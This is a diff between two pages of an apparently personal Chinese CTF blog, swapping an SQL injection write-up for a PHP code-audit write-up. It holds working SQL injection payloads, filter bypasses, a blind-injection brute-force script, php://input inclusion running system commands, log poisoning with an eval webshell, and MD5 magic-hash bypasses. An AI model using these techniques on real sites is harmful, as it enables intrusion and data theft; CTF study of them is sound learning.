@@ -19,59 +19,24 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="1.[GYCTF2020]Blacklist 题目  猜测是SQL注入，直接输入1’试试  确定为SQL注入，联合注入，查询数据库的字段数 1’ union select 1,2,3# ，出现类似黑名单的东西，过滤了部分关键词，尝试堆叠注入。  爆数据库：1’;show databases;#  爆表名：1’;show tables;#  爆FlagHere中的字段：1’;show columns">
+    <meta name="description" content="常用的php伪协议1.php:&#x2F;&#x2F;input        ——用于读取原始的 POST 数据，当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post写入想要执行的php代码，php执行时会将post内容当作文件内容2.php:&#x2F;&#x2F;filter         ——用于读取和修改文件内容，比如对文件进行编码转换">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sql注入">
-<meta property="og:url" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:title" content="web代码审计">
+<meta property="og:url" content="http://zer0-qiao.github.io/2025/01/18/web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
 <meta property="og:site_name" content="Zer0-qiao">
-<meta property="og:description" content="1.[GYCTF2020]Blacklist 题目  猜测是SQL注入，直接输入1’试试  确定为SQL注入，联合注入，查询数据库的字段数 1’ union select 1,2,3# ，出现类似黑名单的东西，过滤了部分关键词，尝试堆叠注入。  爆数据库：1’;show databases;#  爆表名：1’;show tables;#  爆FlagHere中的字段：1’;show columns">
+<meta property="og:description" content="常用的php伪协议1.php:&#x2F;&#x2F;input        ——用于读取原始的 POST 数据，当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post写入想要执行的php代码，php执行时会将post内容当作文件内容2.php:&#x2F;&#x2F;filter         ——用于读取和修改文件内容，比如对文件进行编码转换">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/Blacklist.png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/Blacklist(1).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/Blacklist(2).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/Blacklist(3).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/Blacklist(4).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/Blacklist(5).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/Blacklist(6).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web2.png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web2(1).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web2(2).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web2(3).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web2(4).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web2(5).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web2(6).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web6.png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web6(1).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web6(2).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web6(3).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web6(4).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web6(5).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web6(6).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web7.png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web7(1).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web7(2).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web7(3).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web7(4).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web7(5).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web7(6).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web7(7).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web7(8).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web8.png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web8(1).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web8(2).png">
-<meta property="og:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/web8(3).png">
-<meta property="article:published_time" content="2025-01-17T06:28:19.000Z">
-<meta property="article:modified_time" content="2025-01-17T06:29:54.564Z">
+<meta property="article:published_time" content="2025-01-18T14:40:32.000Z">
+<meta property="article:modified_time" content="2025-01-18T15:09:25.807Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="原创">
 <meta property="article:tag" content="web">
-<meta property="article:tag" content="sql注入">
+<meta property="article:tag" content="代码审计">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://zer0-qiao.github.io/2025/01/17/sql%E6%B3%A8%E5%85%A5/Blacklist.png">
   
   
   
-  <title>sql注入 - Zer0-qiao</title>
+  <title>web代码审计 - Zer0-qiao</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -250,7 +215,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="sql注入"></span>
+            <span id="subtitle" data-typed-text="web代码审计"></span>
           
         </div>
 
@@ -261,8 +226,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-01-17 14:28" pubdate>
-          2025年1月17日 下午
+        <time datetime="2025-01-18 22:40" pubdate>
+          2025年1月18日 晚上
         </time>
       </span>
     
@@ -273,7 +238,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.3k 字
+          855 字
         
       </span>
     
@@ -284,7 +249,7 @@
         
         
         
-          11 分钟
+          8 分钟
         
       </span>
     
@@ -330,46 +295,30 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">sql注入</h1>
+            <h1 id="seo-header">web代码审计</h1>
             
             
               <div class="markdown-body">
                 
-                <p>1.[GYCTF2020]Blacklist<br> 题目<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/Blacklist.png" srcset="/img/loading.gif" lazyload class=""><br> 猜测是SQL注入，直接输入1’试试<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/Blacklist(1).png" srcset="/img/loading.gif" lazyload class=""><br> 确定为SQL注入，联合注入，查询数据库的字段数 1’ union select 1,2,3# ，出现类似黑名单的东西，过滤了部分关键词，尝试堆叠注入。<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/Blacklist(2).png" srcset="/img/loading.gif" lazyload class=""><br> 爆数据库：1’;show databases;#<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/Blacklist(3).png" srcset="/img/loading.gif" lazyload class=""><br> 爆表名：1’;show tables;#<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/Blacklist(4).png" srcset="/img/loading.gif" lazyload class=""><br> 爆FlagHere中的字段：1’;show columns from <code>FlagHere</code>;#<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/Blacklist(5).png" srcset="/img/loading.gif" lazyload class=""><br> 找到了flag,因为爆数据的关键词被过滤了，所以这里用handlar命令来获取flag:<br> 1’;HANDLER FlagHere OPEN;HANDLER FlagHere READ NEXT;HANDLER FlagHere CLOSE;#</p>
-<p> handler命令参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/jesseyoung/article/details/40785137">https://blog.csdn.net/jesseyoung/article/details/40785137</a><br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/Blacklist(6).png" srcset="/img/loading.gif" lazyload class=""></p>
-<p>2.ctf.show——web2<br> 题目：<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web2.png" srcset="/img/loading.gif" lazyload class=""><br> 输入万能语句进行注入，1’ or ‘1&#x3D;&#x3D;1’ #，密码随意输入，出现回显“欢迎你，ctfshow”，所以用户名就是“ctfshow”，所以存在SQL注入。<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web2(1).png" srcset="/img/loading.gif" lazyload class=""><br> 测试回显位置：1’ union select 1,2,3#，所以2就是回显位置。<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web2(2).png" srcset="/img/loading.gif" lazyload class=""><br> 爆数据库名称：1’ union select 1,database(),3 #，所以数据库名为web2<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web2(3).png" srcset="/img/loading.gif" lazyload class=""><br> 爆表名：1 ‘ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’web2’),3 #，密码还是随意，回显出现表名flag<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web2(4).png" srcset="/img/loading.gif" lazyload class=""><br> 爆flag中的字段名：1’ union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;’web2’ and table_name&#x3D;’flag’),3 #,所以只有一个flag字段。<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web2(5).png" srcset="/img/loading.gif" lazyload class=""><br> 最后爆数据： 1’ union select 1,(select flag from flag),3 #,就获得了flag。<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web2(6).png" srcset="/img/loading.gif" lazyload class=""></p>
-<p>3.ctf.show_web6<br> 题目：<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web6.png" srcset="/img/loading.gif" lazyload class=""><br> 我们先进行常规注入，输入万能语句1’ or ‘1&#x3D;&#x3D;1’ #，发现有些字符被过滤了，并且过滤了空格,我们可以使用括号()或者注释&#x2F;<strong>&#x2F;绕过。<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web6(1).png" srcset="/img/loading.gif" lazyload class=""><br> 查字段：admin’&#x2F;</strong>&#x2F;union&#x2F;<strong>&#x2F;select&#x2F;</strong>&#x2F;1,2,3#,密码随意，发现回显为2，所以是可行的。<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web6(2).png" srcset="/img/loading.gif" lazyload class=""><br> 爆数据库名称：admin’&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;select&#x2F;<strong>&#x2F;1,database(),3#，此时的数据库名为web2<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web6(3).png" srcset="/img/loading.gif" lazyload class=""><br> 爆表名：password&#x3D;admin’&#x2F;</strong>&#x2F;or&#x2F;<strong>&#x2F;1&#x3D;1&#x2F;</strong>&#x2F;union&#x2F;<strong>&#x2F;select&#x2F;</strong>&#x2F;1,group_concat(table_name),3&#x2F;<strong>&#x2F;from&#x2F;</strong>&#x2F;information_schema.tables&#x2F;<strong>&#x2F;where&#x2F;</strong>&#x2F;table_schema&#x3D;’web2’#<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web6(4).png" srcset="/img/loading.gif" lazyload class=""><br> 爆flag中的字段名：password&#x3D;admin’&#x2F;<strong>&#x2F;or&#x2F;</strong>&#x2F;1&#x3D;1&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;select&#x2F;<strong>&#x2F;1,group_concat(column_name),3&#x2F;</strong>&#x2F;from&#x2F;<strong>&#x2F;information_schema.columns&#x2F;</strong>&#x2F;where&#x2F;<strong>&#x2F;table_name&#x3D;’flag’#<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web6(5).png" srcset="/img/loading.gif" lazyload class=""><br> 最后爆数据：admin’&#x2F;</strong>&#x2F;or&#x2F;<strong>&#x2F;1&#x3D;1&#x2F;</strong>&#x2F;union&#x2F;<strong>&#x2F;select&#x2F;</strong>&#x2F;1,flag,3&#x2F;<strong>&#x2F;from&#x2F;</strong>&#x2F;flag#，得到flag<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web6(6).png" srcset="/img/loading.gif" lazyload class=""></p>
-<p>4.ctf.show_web7<br> 题目：<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web7.png" srcset="/img/loading.gif" lazyload class=""><br> 随意打开一篇文章，发现存在id传参，所以本题考查的是SQL盲注。<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web7(1).png" srcset="/img/loading.gif" lazyload class=""><br> 尝试注入id&#x3D;1’ or ‘1&#x3D;&#x3D;1’ #，发现有过滤。而注入 id&#x3D;1’or’1&#x3D;&#x3D;1’#后回显正常，所以是过滤了空格，可以用&#x2F;<strong>&#x2F;绕过。<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web7(2).png" srcset="/img/loading.gif" lazyload class=""><br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web7(3).png" srcset="/img/loading.gif" lazyload class=""><br> 注入点为数值型注入,可以尝试联合注入进行脱库，此处id传入负数,后端根据id查询不到内容,就只能展示联合查询的结果，即判断回显位置。<br>  id&#x3D;-1&#x2F;</strong>&#x2F;union&#x2F;<strong>&#x2F;select&#x2F;</strong>&#x2F;1,2,3#<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web7(4).png" srcset="/img/loading.gif" lazyload class=""><br> 爆数据库名：id&#x3D;-1&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;select&#x2F;<strong>&#x2F;1,database(),3#,所以此时的数据库为web7。<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web7(5).png" srcset="/img/loading.gif" lazyload class=""><br> 爆表名：id&#x3D;-1&#x2F;</strong>&#x2F;union&#x2F;<strong>&#x2F;select&#x2F;</strong>&#x2F;1,(select&#x2F;<strong>&#x2F;group_concat(table_name)from&#x2F;</strong>&#x2F;information_schema.tables&#x2F;<strong>&#x2F;where&#x2F;</strong>&#x2F;table_schema&#x3D;”web7”),3#<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web7(6).png" srcset="/img/loading.gif" lazyload class=""><br> 爆字段：id&#x3D;-1&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;select&#x2F;<strong>&#x2F;1,(select&#x2F;</strong>&#x2F;group_concat(column_name)from&#x2F;<strong>&#x2F;information_schema.columns&#x2F;</strong>&#x2F;where&#x2F;<strong>&#x2F;table_schema&#x3D;”web7”&#x2F;</strong>&#x2F;and&#x2F;<strong>&#x2F;table_name&#x3D;”flag”),3#,只有一个flag字段<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web7(7).png" srcset="/img/loading.gif" lazyload class=""><br> 爆数据： id&#x3D;-1&#x2F;</strong>&#x2F;or&#x2F;<strong>&#x2F;1&#x3D;1&#x2F;</strong>&#x2F;union&#x2F;<strong>&#x2F;select&#x2F;</strong>&#x2F;1,flag,3&#x2F;<strong>&#x2F;from&#x2F;</strong>&#x2F;flag#,成功拿到flag。<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web7(8).png" srcset="/img/loading.gif" lazyload class=""><br> 这一题也可以参考大佬的做法，直接用脚本跑出flag<br> ctfshow—web—web7 - anweilx - 博客园</p>
-<p>5.ctf.show_web8<br> 题目：<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web8.png" srcset="/img/loading.gif" lazyload class=""><br> 这一题和ctf.show_web7很相似，但这次过滤的内容更多。<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web8(1).png" srcset="/img/loading.gif" lazyload class=""><br> 所以需要简单测试一下,将id后面的参数依次改为单引号，union，and，select等必要字符。<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web8(2).png" srcset="/img/loading.gif" lazyload class=""><br> 经过多次测试，总结了一下过滤表。<br>     空格                 —— 可以使用括号() 或者注释&#x2F;**&#x2F; 绕过。</p>
-<pre><code class="hljs"> and                  —— 可以使用or或者 || ，或者 &amp;&amp;替代。
+                <ol>
+<li>常用的php伪协议<br>1.php:&#x2F;&#x2F;input        ——用于读取原始的 POST 数据，当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post写入想要执行的php代码，php执行时会将post内容当作文件内容<br>2.php:&#x2F;&#x2F;filter         ——用于读取和修改文件内容，比如对文件进行编码转换、数据解密等操作。</li>
+<li>MD5哈希计算后以0E开头的原值和哈希值：<br>QNKCDZO           0e830400451993494058024219903391<br>240610708         0e462097431906509019562988736854<br>s878926199a       0e545993274517709034328855841020<br>s155964671a       0e342768416822451524974117254469<br>s214587387a       0e848240448830537924465865611904<br>s214587387a       0e848240448830537924465865611904<br>s878926199a       0e545993274517709034328855841020<br>s1091221200a      0e940624217856561557816327384675<br>s1885207154a      0e509367213418206700842008763514<br>s1502113478a      0e861580163291561247404381396064<br>s1885207154a      0e509367213418206700842008763514<br>s1836677006a      0e481036490867661113260034900752<br>s155964671a       0e342768416822451524974117254469<br>s1184209335a      0e072485820392773389523109082030<br>s1665632922a      0e731198061491163073197128363787<br>s1502113478a      0e861580163291561247404381396064<br>s1836677006a      0e481036490867661113260034900752<br>s1091221200a      0e940624217856561557816327384675<br>s155964671a       0e342768416822451524974117254469<br>s1502113478a      0e861580163291561247404381396064<br>s155964671a       0e342768416822451524974117254469<br>s1665632922a      0e731198061491163073197128363787<br>s155964671a       0e342768416822451524974117254469<br>s1091221200a      0e940624217856561557816327384675<br>s1836677006a      0e481036490867661113260034900752<br>s1885207154a      0e509367213418206700842008763514<br>s532378020a       0e220463095855511507588041205815<br>s878926199a       0e545993274517709034328855841020<br>s1091221200a      0e940624217856561557816327384675<br>s214587387a       0e848240448830537924465865611904<br>s1502113478a      0e861580163291561247404381396064<br>s1091221200a      0e940624217856561557816327384675<br>s1665632922a      0e731198061491163073197128363787<br>s1885207154a      0e509367213418206700842008763514<br>s1836677006a      0e481036490867661113260034900752<br>s1665632922a      0e731198061491163073197128363787<br>s878926199a       0e545993274517709034328855841020</li>
+</ol>
+<p>1.ctf.show_web3</p>
 
- 单引号             —— 被过滤的话，字符型注入就不可行了，数字型注入可以。
+<p> 这段 PHP 代码使用了 include 语句,试图从 $_GET 超全局变量中获取名为 url 的参数值，并将该值对应的文件包含进来。<br> 所以我们可以直接写入php文件，通过GET请求输入url&#x3D;php:&#x2F;&#x2F;input。 而php代码的内容为执行系统命令,查看当前目录下所有文件。<br>    ?url&#x3D;php:&#x2F;&#x2F;input            – GET请求的url中拼接伪协议<br>    <?php system('ls')?>    – post请求内容构造需要执行的代码<br> <br> 这里我利用的是hackbar，执行php代码后，回显得到ctf_go_go_go index.php文件，很明显，flag就在这个文件中。<br> <br> 直接在url地址栏中输入url参数,访问ctf_go_go_go文件，就可以得到flag:<br>  ?url&#x3D;ctf_go_go_go<br> </p>
+<p>2.ctf.show_web4</p>
 
- 逗号                 —— 可以使用特殊语法绕过, 比如:substr(database(),1,1) 可以用                                  substr(database() from 1 for 1)来代替。
+<p> 看起来和ctf.show_web3很像，但我们测试文件包含没有成功，所以这里考虑日志注入:<br>  ?url&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>    &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log是 Nginx 服务器默认的访问日志文件路径。<br> <br> 发现可以得到日志文件，接着利用bp抓包，在User-Agent后面插入一句话木马:<br>  <?php @eval($_POST['a']);?><br> <br> 用蚁剑进行连接测试 ，注意URL地址写的是日志地址，并且应该是用http进行连接（我一开始用的https，报错了）。<br> <br> 连接成功后，在www目录下发现flag.txt文件，即可得到flag.<br> </p>
+<p>3.ctf.show_web5</p>
 
- union               —— 可以用盲注替代联合注入，可以用 || 或者&amp;&amp;。
+<p> 附上源码：<br>  &lt;?php<br>        $flag&#x3D;””;<br>        $v1&#x3D;$_GET[‘v1’];<br>        $v2&#x3D;$_GET[‘v2’];<br>        if(isset($v1) &amp;&amp; isset($v2)){<br>            if(!ctype_alpha($v1)){<br>                die(“v1 error”);<br>            }<br>            if(!is_numeric($v2)){<br>                die(“v2 error”);<br>            }<br>            if(md5($v1)&#x3D;&#x3D;md5($v2)){<br>                echo $flag;<br>            }<br>        }else{</p>
+<pre><code class="hljs">        echo &quot;where is flag?&quot;;
+    &#125;
+?&gt;
 </code></pre>
-<p>因为过滤的字符太多了，手工进行注入太麻烦，所以建议用脚本进行爆破。</p>
-<p>import requests</p>
-<p>url &#x3D; “<a target="_blank" rel="noopener" href="http://cb3870a1-df1c-4147-b0e9-bd6d0a5706a6.challenge.ctf.show/index.php?id=-1">http://cb3870a1-df1c-4147-b0e9-bd6d0a5706a6.challenge.ctf.show/index.php?id=-1</a>“<br>flag &#x3D; “”</p>
-<p>for num in range(1,60):<br>    l &#x3D; 33<br>    r &#x3D; 130<br>    mid &#x3D; (l+r)&gt;&gt;1<br>    while l&lt;r:<br>        # 数据库：web8<br>        # sql &#x3D; “ascii(substr((select&#x2F;<strong>&#x2F;database())&#x2F;<strong>&#x2F;from&#x2F;</strong>&#x2F;{}&#x2F;<strong>&#x2F;for&#x2F;</strong>&#x2F;1))&gt;{}”.format(num,mid)<br>        # 表：flag,page,user<br>        # sql &#x3D; “ascii(substr((select&#x2F;</strong>&#x2F;group_concat(table_name)&#x2F;<strong>&#x2F;from&#x2F;</strong>&#x2F;information_schema.tables&#x2F;<strong>&#x2F;where&#x2F;</strong>&#x2F;table_schema&#x3D;database())&#x2F;<strong>&#x2F;from&#x2F;</strong>&#x2F;{}&#x2F;<strong>&#x2F;for&#x2F;</strong>&#x2F;1))&gt;{}”.format(num,mid)<br>        # 列：flag<br>        # sql &#x3D; “ascii(substr((select&#x2F;<strong>&#x2F;group_concat(column_name)&#x2F;</strong>&#x2F;from&#x2F;<strong>&#x2F;information_schema.columns&#x2F;</strong>&#x2F;where&#x2F;<strong>&#x2F;table_name&#x3D;0x666c6167)&#x2F;</strong>&#x2F;from&#x2F;<strong>&#x2F;{}&#x2F;</strong>&#x2F;for&#x2F;<strong>&#x2F;1))&gt;{}”.format(num,mid)<br>        # ctfshow{b54332e2-57d2-47c4-933a-d455e9b7e950}<br>        sql &#x3D; “ascii(substr((select&#x2F;</strong>&#x2F;flag&#x2F;<strong>&#x2F;from&#x2F;</strong>&#x2F;flag)&#x2F;<strong>&#x2F;from&#x2F;</strong>&#x2F;{}&#x2F;<strong>&#x2F;for&#x2F;</strong>&#x2F;1))&gt;{}”.format(num,mid)</p>
-<pre><code class="hljs">    payload = url + &quot;/**/||/**/&quot; + sql
-
-    # print(payload)
-
-    res = requests.get(payload)
-    
-    if &#39;If&#39; in res.text:
-        l = mid + 1
-    else:
-        r = mid
-    mid = (l+r)&gt;&gt;1
-if chr(mid)==&quot; &quot;:
-    break
-flag += chr(mid)
-print(flag)
-</code></pre>
-<p> 爆破得到flag<br> <img src="/2025/01/17/sql%E6%B3%A8%E5%85%A5/web8(3).png" srcset="/img/loading.gif" lazyload class=""></p>
+<p> 源码分析：<br>    isset($v1) &amp;&amp; isset($v2)：判断 v1 和 v2 两个参数是否都被设置了（即用户是否通过 URL 利用GET方式传递了这两个参数），如果没有都设置，则直接输出 “where is flag?” 提示信息。<br>    !ctype_alpha($v1)：使用 ctype_alpha 函数来验证 $v1 参数内容是否全部由字母组成，如果不是，则输出 “v1 error” 并终止脚本执行（通过 die 函数）。<br>    !is_numeric($v2)：使用 is_numeric 函数验证 $v2 参数内容是否为数字，如果不是数字则输出 “v2 error” 并终止脚本执行。<br>    md5($v1)&#x3D;&#x3D;md5($v2)：对 $v1 和 $v2 分别进行 MD5 哈希计算，然后比较它们的哈希值是否相等，如果相等就输出 $flag 的值，这里存在一个漏洞利用点，因为 PHP 中 md5 函数对于一些特殊的字符串（比如以 0e 开头且后面数字部分在比较时会被当作科学计数法的零值的情况）在进行比较时会出现哈希值相等但原始值不同的 “哈希碰撞” 情况，可以利用这个特性来绕过验证获取 flag（前提是能找到符合条件的合适字符串对）。</p>
+<p> 所以简单来说就是，md5碰撞，只要是0e开头MD5值，默认为相等，v1为字符，v2为数值<br>   payload:?v1&#x3D;QNKCDZO&amp;v2&#x3D;240610708<br> 返回flag。<br> </p>
 
                 
               </div>
@@ -407,7 +356,7 @@ print(flag)
       
         <a href="/tags/web/" class="print-no-link">#web</a>
       
-        <a href="/tags/sql%E6%B3%A8%E5%85%A5/" class="print-no-link">#sql注入</a>
+        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="print-no-link">#代码审计</a>
       
     </div>
   
@@ -419,8 +368,8 @@ print(flag)
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>sql注入</div>
-      <div>http://zer0-qiao.github.io/2025/01/17/sql注入/</div>
+      <div>web代码审计</div>
+      <div>http://zer0-qiao.github.io/2025/01/18/web代码审计/</div>
     </div>
     <div class="license-meta">
       
@@ -432,7 +381,7 @@ print(flag)
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年1月17日</div>
+          <div>2025年1月18日</div>
         </div>
       
       
@@ -464,18 +413,12 @@ print(flag)
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/01/18/web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="web代码审计">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">web代码审计</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/01/14/hello-world/" title="Hello World">
-                        <span class="hidden-mobile">Hello World</span>
+                      <a href="/2025/01/17/sql%E6%B3%A8%E5%85%A5/" title="sql注入">
+                        <span class="hidden-mobile">sql注入</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
